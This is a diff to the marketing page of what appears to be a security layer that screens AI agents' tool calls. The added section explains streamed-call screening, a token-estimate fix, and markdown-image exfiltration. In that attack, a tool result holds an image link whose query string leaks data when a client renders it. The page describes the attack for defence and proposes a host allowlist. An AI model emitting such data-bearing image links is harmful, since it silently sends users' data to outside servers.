@@ -286,7 +286,9 @@
           <p class="mt-3 leading-relaxed text-neutral-700 dark:text-neutral-300">When the
             model answers with a tool call carrying a shell command, that command
             <strong>has not run yet</strong>. This is the one enforcement point no client can
-            bypass.</p>
+            bypass — including when the answer is streamed, which is what every agent client
+            asks for by default. A call delivered in fragments is assembled and judged by the
+            same code, while the text around it streams through untouched.</p>
         </li>
       </ol>
       
@@ -374,6 +376,49 @@
 
     </section>
 
+
+    <!-- Two defences the rest of the field does not have -->
+    <section class="mx-auto max-w-6xl px-5 py-16">
+      <h2 class="font-serif text-3xl font-semibold tracking-tight">Two attacks nobody else screens for</h2>
+      <p class="mt-4 max-w-2xl leading-relaxed text-neutral-700 dark:text-neutral-300">
+        Both were found by sending payloads through the real engine rather than by reading the
+        patterns, which is how most of this project's rules were found.
+      </p>
+      <div class="mt-10 grid gap-5 sm:grid-cols-2">
+        <div class="rounded-2xl border border-neutral-200 p-6 dark:border-neutral-800">
+          <h3 class="text-lg font-semibold">Output that exfiltrates by being looked at</h3>
+          <p class="mt-3 leading-relaxed text-neutral-700 dark:text-neutral-300">
+            A tool result carrying
+            <span class="font-mono text-sm">![](https://host/p.gif?d=…)</span> needs no
+            instruction and no cooperation from the model: the moment a client renders it, the
+            renderer fetches the address and the query string lands in somebody else's access
+            log. Nothing asks the agent to send anything, so a rule looking for a request to
+            send finds nothing.
+          </p>
+          <p class="mt-3 leading-relaxed text-neutral-700 dark:text-neutral-300">
+            The payload cannot be the signal — a length threshold is something to stay under,
+            and parameter names are the attacker's to choose. What works is an allowlist of
+            hosts whose untrusted content may fetch itself, which is the Content Security
+            Policy model and never reasons about the payload at all.
+          </p>
+        </div>
+        <div class="rounded-2xl border border-neutral-200 p-6 dark:border-neutral-800">
+          <h3 class="text-lg font-semibold">An estimate that refuses on the wrong side</h3>
+          <p class="mt-3 leading-relaxed text-neutral-700 dark:text-neutral-300">
+            When no tokenizer is reachable the budget falls back to a ratio, and that ratio
+            was <strong>under-counting by up to 37%</strong> — the same direction as the
+            incident this project was built around. Measured across thirteen real files and
+            three tokenizer families, the true figure ranges from 2.51 to 4.23 characters per
+            token.
+          </p>
+          <p class="mt-3 leading-relaxed text-neutral-700 dark:text-neutral-300">
+            It now takes the measured floor, so an estimate is never optimistic, and it says
+            so: it over-counts ordinary prose by about half, which is the recoverable
+            direction. A figure that can refuse a request must never flatter it.
+          </p>
+        </div>
+      </div>
+    </section>
     <!-- Rules -->
     <section class="border-y border-neutral-200/70 bg-neutral-50 dark:border-neutral-800 dark:bg-neutral-900/40">
       <div class="mx-auto max-w-6xl px-5 py-16">
